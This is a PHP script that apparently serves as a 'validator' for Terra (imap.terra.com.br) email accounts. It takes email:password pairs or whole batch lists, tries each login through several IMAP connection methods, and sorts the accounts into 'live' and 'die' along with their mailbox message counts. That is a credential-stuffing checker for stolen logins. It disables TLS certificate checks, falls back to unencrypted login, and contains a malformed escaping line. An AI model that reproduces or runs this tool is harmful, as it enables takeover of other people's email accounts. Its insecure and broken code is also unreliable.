<?php
/**
 * api.php — Validador IMAP Terra (VERSÃO DEFINITIVA)
 * Trata TODAS as ações: init, check, diagnostic, test
 * Múltiplos métodos de conexão + log em arquivo
 */
declare(strict_types=1);

// Headers CORS + JSON
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

class TerraValidator {
    private array $config;
    private array $diag = [];

    public function __construct() {
        $this->config = [
            'imap_server'  => 'imap.terra.com.br',
            'imap_port'     => 993,
            'timeout'       => 20,
            'max_retries'   => 1,
            'log_file'      => __DIR__ . '/debug.log',
        ];
    }

    // ════════════════════════════════════════════════════════
    //  LOG
    // ════════════════════════════════════════════════════════

    private function log(string $msg): void {
        $ts = date('Y-m-d H:i:s');
        $line = "[{$ts}] {$msg}\n";
        @file_put_contents($this->config['log_file'], $line, FILE_APPEND | LOCK_EX);
    }

    // ════════════════════════════════════════════════════════
    //  INIT — Frontend chama isso ao carregar a página
    // ════════════════════════════════════════════════════════

    public function init(): array {
        $this->log("INIT chamado");

        $exts = [
            'openssl' => extension_loaded('openssl'),
            'curl'    => extension_loaded('curl'),
            'imap'    => extension_loaded('imap'),
            'sockets' => function_exists('fsockopen'),
        ];

        // Teste rápido de DNS (não bloqueia se falhar)
        $dns_ok = false;
        $dns_ip = '';
        $ips = @gethostbynamel($this->config['imap_server']);
        if (!empty($ips)) {
            $dns_ok = true;
            $dns_ip = $ips[0];
        }

        // Teste rápido de TCP (3 segundos)
        $tcp_ok = false;
        $tcp_port = 0;
        foreach ([993, 143] as $port) {
            $t = microtime(true);
            $fp = @fsockopen($this->config['imap_server'], $port, $e, $s, 3);
            if ($fp !== false) {
                $tcp_ok = true;
                $tcp_port = $port;
                fclose($fp);
                $this->log("INIT: TCP porta {$port} OK (" . round((microtime(true)-$t)*1000,0) . "ms)");
                break;
            } else {
                $this->log("INIT: TCP porta {$port} FALHOU: errno={$e} {$s}");
            }
        }

        $result = [
            'status'       => 'ok',
            'ready'        => true,
            'server'       => $this->config['imap_server'],
            'port'         => $this->config['imap_port'],
            'php_version'  => PHP_VERSION,
            'extensions'   => $exts,
            'dns_ok'       => $dns_ok,
            'dns_ip'       => $dns_ip,
            'tcp_ok'       => $tcp_ok,
            'tcp_port'     => $tcp_port,
            'can_connect'  => $tcp_ok,
            'timestamp'    => date('Y-m-d H:i:s'),
        ];

        $this->log("INIT resultado: " . json_encode($result));
        return $result;
    }

    // ════════════════════════════════════════════════════════
    //  VALIDATE
    // ════════════════════════════════════════════════════════

    public function validate(string $email, string $password): array {
        $this->log("VALIDATE: email={$email}");
        $start = microtime(true);
        $this->diag = [];

        try {
            $result = $this->tryAllMethods($email, $password);
        } catch (\Throwable $e) {
            $this->log("EXCEPTION: " . $e->getMessage());
            $result = [
                'status'    => 'die',
                'email'     => $email,
                'message'   => 'Exceção: ' . $e->getMessage(),
                'reason'    => 'exception',
                'retryable' => false,
            ];
        }

        $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
        $result['debug']      = implode(' | ', $this->diag);
        $result['timestamp']  = date('Y-m-d H:i:s');

        $this->log("VALIDATE resultado: status={$result['status']} reason=" . ($result['reason'] ?? '?') . " ms={$result['elapsed_ms']}");

        return $result;
    }

    public function validateBatch(array $credentials): array {
        $this->log("BATCH: " . count($credentials) . " credenciais");
        $results = [];
        foreach ($credentials as $cred) {
            $email    = $cred['email']    ?? '';
            $password = $cred['password'] ?? '';
            if ($email === '' || $password === '') {
                $results[] = ['email' => $email, 'status' => 'die', 'message' => 'Vazio'];
                continue;
            }
            $results[] = $this->validate($email, $password);
        }
        return [
            'total'     => count($results),
            'live'      => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
            'die'       => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
            'results'   => $results,
            'timestamp' => date('Y-m-d H:i:s'),
        ];
    }

    // ════════════════════════════════════════════════════════
    //  DIAGNOSTIC
    // ════════════════════════════════════════════════════════

    public function diagnostic(): array {
        $this->log("DIAGNOSTIC chamado");
        $r = [
            'server'   => $this->config['imap_server'],
            'port'     => $this->config['imap_port'],
            'php_ver'  => PHP_VERSION,
            'exts'     => [
                'openssl' => extension_loaded('openssl'),
                'curl'    => extension_loaded('curl'),
                'imap'    => extension_loaded('imap'),
            ],
            'tests'    => [],
        ];

        // DNS
        $ips = @gethostbynamel($this->config['imap_server']);
        $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
        if (empty($ips)) {
            $r['tests']['dns']['error'] = 'DNS falhou';
            $r['can_connect'] = false;
            return $r;
        }

        // TCP 993
        $t = microtime(true);
        $tcp993 = @fsockopen($ips[0], 993, $e, $s, 10);
        $r['tests']['tcp_993'] = ['ok' => $tcp993 !== false, 'ms' => round((microtime(true)-$t)*1000,0)];
        if ($tcp993 === false) {
            $r['tests']['tcp_993']['error'] = "errno={$e}; {$s}";
        } else { fclose($tcp993); }

        // TCP 143
        $t = microtime(true);
        $tcp143 = @fsockopen($ips[0], 143, $e2, $s2, 10);
        $r['tests']['tcp_143'] = ['ok' => $tcp143 !== false, 'ms' => round((microtime(true)-$t)*1000,0)];
        if ($tcp143 === false) {
            $r['tests']['tcp_143']['error'] = "errno={$e2}; {$s2}";
        } else { fclose($tcp143); }

        // SSL 993 via fsockopen
        if ($tcp993 !== false) {
            $t = microtime(true);
            $ssl = @fsockopen('ssl://' . $this->config['imap_server'], 993, $e3, $s3, 10);
            $r['tests']['ssl_993'] = ['ok' => $ssl !== false, 'ms' => round((microtime(true)-$t)*1000,0)];
            if ($ssl) {
                stream_set_timeout($ssl, 10);
                $g = @fgets($ssl, 8192);
                $r['tests']['ssl_993']['greeting'] = $g ?: '(vazio)';
                $r['tests']['ssl_993']['imap_ok'] = ($g && stripos($g, 'OK') !== false);
                fclose($ssl);
            } else {
                $r['tests']['ssl_993']['error'] = "errno={$e3}; {$s3}";
            }
        }

        // cURL
        if (extension_loaded('curl')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL            => 'imaps://imap.terra.com.br:993/',
                CURLOPT_USERNAME       => 'test@test.com',
                CURLOPT_PASSWORD       => 'test',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT        => 10,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_NOSIGNAL       => 1,
            ]);
            $res = curl_exec($ch);
            $err = curl_error($ch);
            $r['tests']['curl_imap'] = [
                'ok'   => $res !== false,
                'err'  => $err,
                'code' => curl_getinfo($ch, CURLINFO_HTTP_CODE),
            ];
            curl_close($ch);
        }

        // Resumo
        $r['can_connect'] = ($r['tests']['tcp_993']['ok'] ?? false) || ($r['tests']['tcp_143']['ok'] ?? false);
        $r['port_993_blocked'] = !($r['tests']['tcp_993']['ok'] ?? false);
        $r['port_143_blocked'] = !($r['tests']['tcp_143']['ok'] ?? false);

        $this->log("DIAGNOSTIC: " . json_encode($r));
        return $r;
    }

    // ════════════════════════════════════════════════════════
    //  TENTA TODOS OS MÉTODOS
    // ════════════════════════════════════════════════════════

    private function tryAllMethods(string $email, string $password): array {
        // 1. cURL
        if (extension_loaded('curl')) {
            $r = $this->mCurl($email, $password);
            if ($r !== null) return $r;
        }

        // 2. fsockopen ssl://
        $r = $this->mFsockSSL($email, $password);
        if ($r !== null) return $r;

        // 3. stream ssl://
        $r = $this->mStreamSSL($email, $password);
        if ($r !== null) return $r;

        // 4. stream tls://
        $r = $this->mStreamTLS($email, $password);
        if ($r !== null) return $r;

        // 5. STARTTLS porta 143
        $r = $this->mStartTLS($email, $password);
        if ($r !== null) return $r;

        // 6. Plain TCP porta 143 (último recurso — sem SSL)
        $r = $this->mPlain143($email, $password);
        if ($r !== null) return $r;

        // 7. imap_open
        if (extension_loaded('imap')) {
            $r = $this->mImapExt($email, $password);
            if ($r !== null) return $r;
        }

        return [
            'status'    => 'die',
            'email'     => $email,
            'message'   => 'Todos os métodos falharam',
            'reason'    => 'all_methods_failed',
            'retryable' => false,
        ];
    }

    // ─── MÉTODO 1: cURL ───
    private function mCurl(string $email, string $password): ?array {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => 'imaps://imap.terra.com.br:993/INBOX',
            CURLOPT_USERNAME       => $email,
            CURLOPT_PASSWORD       => $password,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $this->config['timeout'],
            CURLOPT_CONNECTTIMEOUT => $this->config['timeout'],
            CURLOPT_NOSIGNAL       => 1,
            CURLOPT_CUSTOMREQUEST  => 'STATUS INBOX (MESSAGES)',
        ]);

        $result = curl_exec($ch);
        $err    = curl_error($ch);
        $code   = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($result !== false) {
            $this->diag[] = 'cURL: OK';
            $msgs = 0;
            if (preg_match('/MESSAGES\s+(\d+)/i', (string)$result, $m)) $msgs = (int)$m[1];
            return [
                'status'  => 'live',
                'email'   => $email,
                'message' => 'OK via cURL',
                'mailbox_messages' => $msgs,
                'method'  => 'curl',
            ];
        }

        $el = strtolower($err);
        $this->diag[] = "cURL fail: {$err}";

        if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false || strpos($el, 'credential') !== false) {
            return ['status'=>'die','email'=>$email,'message'=>'Invalid credentials','reason'=>'invalid_credentials','retryable'=>false,'method'=>'curl'];
        }

        return null;
    }

    // ─── MÉTODO 2: fsockopen ssl:// ───
    private function mFsockSSL(string $email, string $password): ?array {
        $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $this->config['timeout']);
        if ($socket === false) {
            $this->diag[] = "fsock(ssl:993) fail: {$errno}/{$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'fsock_ssl');
    }

    // ─── MÉTODO 3: stream_socket ssl:// ───
    private function mStreamSSL(string $email, string $password): ?array {
        $ctx = stream_context_create(['ssl' => [
            'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true,
        ]]);
        $socket = @stream_socket_client('ssl://imap.terra.com.br:993', $errno, $errstr, $this->config['timeout'], STREAM_CLIENT_CONNECT, $ctx);
        if ($socket === false) {
            $this->diag[] = "stream(ssl:993) fail: {$errno}/{$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'stream_ssl');
    }

    // ─── MÉTODO 4: stream_socket tls:// ───
    private function mStreamTLS(string $email, string $password): ?array {
        $ctx = stream_context_create(['ssl' => [
            'verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true,
        ]]);
        $socket = @stream_socket_client('tls://imap.terra.com.br:993', $errno, $errstr, $this->config['timeout'], STREAM_CLIENT_CONNECT, $ctx);
        if ($socket === false) {
            $this->diag[] = "stream(tls:993) fail: {$errno}/{$errstr}";
            return null;
        }
        return $this->doImapLogin($socket, $email, $password, 'stream_tls');
    }

    // ─── MÉTODO 5: STARTTLS porta 143 ───
    private function mStartTLS(string $email, string $password): ?array {
        $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $this->config['timeout']);
        if ($socket === false) {
            $this->diag[] = "fsock(tcp:143) fail: {$errno}/{$errstr}";
            return null;
        }
        stream_set_timeout($socket, $this->config['timeout']);

        $greeting = @fgets($socket, 8192);
        if (!$greeting || stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = 'STARTTLS: greeting fail';
            return null;
        }

        fwrite($socket, "A001 STARTTLS\r\n");
        $resp = $this->readUntilTag($socket, 'A001');
        if (!$resp || !preg_match('/A001\s+OK/i', $resp)) {
            fclose($socket);
            $this->diag[] = 'STARTTLS rejected';
            return null;
        }

        $crypto = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($crypto !== true) {
            fclose($socket);
            $this->diag[] = 'STARTTLS crypto fail';
            return null;
        }

        $this->diag[] = 'STARTTLS OK';
        return $this->doImapLogin($socket, $email, $password, 'starttls');
    }

    // ─── MÉTODO 6: Plain TCP 143 (sem SSL — último recurso) ───
    private function mPlain143(string $email, string $password): ?array {
        $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $this->config['timeout']);
        if ($socket === false) {
            $this->diag[] = "fsock(plain:143) fail: {$errno}/{$errstr}";
            return null;
        }

        $greeting = @fgets($socket, 8192);
        if (!$greeting || stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = 'Plain143: greeting fail';
            return null;
        }

        $this->diag[] = 'Plain143: conectado (sem SSL)';
        return $this->doImapLogin($socket, $email, $password, 'plain_143');
    }

    // ─── MÉTODO 7: imap_open ───
    private function mImapExt(string $email, string $password): ?array {
        $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
        $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
        if ($conn !== false) {
            $info = @imap_mailboxmsginfo($conn);
            $msgs = $info->Nmsgs ?? 0;
            @imap_close($conn);
            $this->diag[] = 'imap_open: OK';
            return ['status'=>'live','email'=>$email,'message'=>'OK via imap_open','mailbox_messages'=>$msgs,'method'=>'imap_ext'];
        }
        $err = imap_last_error();
        $this->diag[] = "imap_open fail: {$err}";
        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
            return ['status'=>'die','email'=>$email,'message'=>'Invalid credentials','reason'=>'invalid_credentials','retryable'=>false,'method'=>'imap_ext'];
        }
        return null;
    }

    // ════════════════════════════════════════════════════════
    //  IMAP LOGIN (socket manual)
    // ════════════════════════════════════════════════════════

    private function doImapLogin($socket, string $email, string $password, string $method): ?array {
        stream_set_timeout($socket, $this->config['timeout']);

        // Greeting (se já não foi lido)
        $greeting = @fgets($socket, 8192);
        if ($greeting === false || $greeting === '') {
            // Talvez já foi lido no método anterior — tenta continuar
            $this->diag[] = "{$method}: sem greeting (ok se já lido)";
        } elseif (stripos($greeting, 'OK') === false) {
            fclose($socket);
            $this->diag[] = "{$method}: greeting sem OK: " . trim($greeting);
            return null;
        } else {
            $this->diag[] = "{$method}: greeting OK";
        }

        // LOGIN
        $tag = 'L001';
        $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
        $safe_pass  = str_replace(['\', '"'], ['\\', '\"'], $password);
        $cmd = "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n";

        if (fwrite($socket, $cmd) === false) {
            fclose($socket);
            $this->diag[] = "{$method}: write fail";
            return null;
        }

        $response = $this->readUntilTag($socket, $tag);
        $meta = stream_get_meta_data($socket);

        if ($response === null || $response === '') {
            fclose($socket);
            $this->diag[] = "{$method}: resposta vazia";
            return null;
        }

        if (!empty($meta['timed_out'])) {
            fclose($socket);
            $this->diag[] = "{$method}: timeout";
            return null;
        }

        $qt = preg_quote($tag, '/');

        // OK
        if (preg_match('/' . $qt . '\s+OK/i', $response)) {
            $msgs = 0;
            fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
            $sresp = $this->readUntilTag($socket, 'S001');
            if ($sresp && preg_match('/MESSAGES\s+(\d+)/i', $sresp, $m)) $msgs = (int)$m[1];
            fwrite($socket, "X001 LOGOUT\r\n");
            fclose($socket);

            $this->diag[] = "{$method}: LOGIN OK";
            return [
                'status'  => 'live',
                'email'   => $email,
                'message' => 'Autenticação bem-sucedida',
                'mailbox_messages' => $msgs,
                'method'  => $method,
            ];
        }

        // NO
        if (preg_match('/' . $qt . '\s+NO/i', $response)) {
            fclose($socket);
            $this->diag[] = "{$method}: credenciais inválidas";
            return ['status'=>'die','email'=>$email,'message'=>'Invalid credentials','reason'=>'invalid_credentials','retryable'=>false,'method'=>$method];
        }

        // BAD
        if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
            fclose($socket);
            $this->diag[] = "{$method}: BAD: " . trim($response);
            return null;
        }

        fclose($socket);
        $this->diag[] = "{$method}: inesperado: " . trim($response);
        return null;
    }

    // ─── Helpers ───

    private function readUntilTag($socket, string $tag): ?string {
        $buffer = '';
        $deadline = microtime(true) + $this->config['timeout'];
        while (!feof($socket)) {
            $line = @fgets($socket, 8192);
            if ($line === false) break;
            $buffer .= $line;
            if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
            $meta = stream_get_meta_data($socket);
            if (!empty($meta['timed_out'])) break;
            if (microtime(true) > $deadline) break;
        }
        return $buffer !== '' ? $buffer : null;
    }
}

// ════════════════════════════════════════════════════════════════
//  ROTEAMENTO — TRATA TODAS AS AÇÕES
// ════════════════════════════════════════════════════════════════

$action = $_GET['action'] ?? '';
$validator = new TerraValidator();

// ─── INIT: Frontend chama ao carregar ───
if ($action === 'init') {
    echo json_encode($validator->init(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ─── DIAGNOSTIC: Teste de conectividade ───
if ($action === 'diagnostic' || $action === 'test') {
    echo json_encode($validator->diagnostic(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ─── CHECK: Validar credenciais ───
if ($action === 'check' || $action === '' || $action === 'validate') {

    // Aceita POST form, JSON, ou raw text
    $input = $_POST;
    $ct = $_SERVER['CONTENT_TYPE'] ?? '';

    if (empty($input) && stripos($ct, 'application/json') !== false) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $decoded = json_decode($raw, true);
            if (is_array($decoded)) $input = $decoded;
        }
    }

    // Tenta raw text (email:password)
    if (empty($input)) {
        $raw = file_get_contents('php://input');
        if (!empty($raw)) {
            $parts = explode(':', trim($raw), 2);
            if (count($parts) === 2) {
                $input = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    $email    = $input['email']    ?? '';
    $password = $input['password'] ?? '';
    $batch    = $input['batch']    ?? null;

    // Formato cred
    if ($email === '' && !empty($input['cred'])) {
        $parts = explode(':', $input['cred'], 2);
        if (count($parts) === 2) {
            $email = trim($parts[0]);
            $password = trim($parts[1]);
        }
    }

    // Formato list
    if ($email === '' && empty($batch) && !empty($input['list'])) {
        $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
        $batch = [];
        foreach ($lines as $line) {
            $parts = explode(':', $line, 2);
            if (count($parts) === 2) {
                $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
            }
        }
    }

    if ($batch && is_array($batch) && count($batch) > 0) {
        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } elseif ($email !== '' && $password !== '') {
        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    } else {
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'error'  => 'Credenciais ausentes',
            'usage'  => [
                'json'  => 'POST {"email":"user@terra.com.br","password":"senha"}',
                'form'  => 'POST email=user@terra.com.br&password=senha',
                'cred'  => 'POST cred=user@terra.com.br:senha',
                'batch' => 'POST {"batch":[...]}',
            ],
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
    exit;
}

// ─── AÇÃO DESCONHECIDA: não retorna 404, retorna ok ───
// (para não quebrar o frontend)
echo json_encode([
    'status'  => 'ok',
    'message' => 'API ativa',
    'actions' => ['init', 'check', 'diagnostic'],
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
